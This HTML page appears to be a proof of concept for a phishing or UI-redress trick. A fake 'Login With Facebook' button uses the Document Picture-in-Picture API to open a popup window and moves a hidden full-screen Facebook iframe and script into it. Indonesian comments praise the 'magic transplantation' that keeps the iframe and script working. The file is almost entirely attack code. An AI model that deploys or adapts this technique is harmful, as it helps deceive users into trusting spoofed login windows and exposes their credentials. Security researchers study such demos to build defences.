<title>Social Connect</title>
<style>#content { display: none; }</style>

<center>
<br><br><br><h2>Login With the <b>Facebook</b>: <br><br><br><br>
<img style="cursor: pointer;" src=https://scandiweb.com/blog/wp-content/uploads/2021/02/facebook-login-button-png-11.png id="button">

<div id="content">
<title>Facebook</title>
<iframe id=frm style="position: fixed;display:none;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 999999;height: 100%;" src=https://facebook.com></iframe>

<script>
// Embedded script yang ikut tertransplant
function handleAuth() {
    // Function ini akan tetap work di PiP context!
    console.log('Auth handling in PiP window!');
    
    // Bisa access iframe content
    if (window.frm && frm.contentWindow) {
        console.log('Iframe accessible in new context');
    }
}
</script>
</div>

<script> 
    var pipOpen = async () => {
        // Buat PiP window
        pipWindow = await documentPictureInPicture.requestWindow({
            width: 600,
            height: 700
        });

        // ðŸŽ¯ MAGIC TRANSPLANTATION: Pindahkan entire content
        pipWindow.document.body.append(content); 
        
        // ðŸŽ¯ ACCESS PRESERVED: iframe tetap accessible
        pipWindow.frm.style.display='block';
        
        // ðŸŽ¯ SCRIPT PRESERVATION: embedded script tetap work
        setTimeout(() => {
            pipWindow.handleAuth(); // Function masih executable!
        }, 1000);

    };
    button.onclick = pipOpen;
</script>
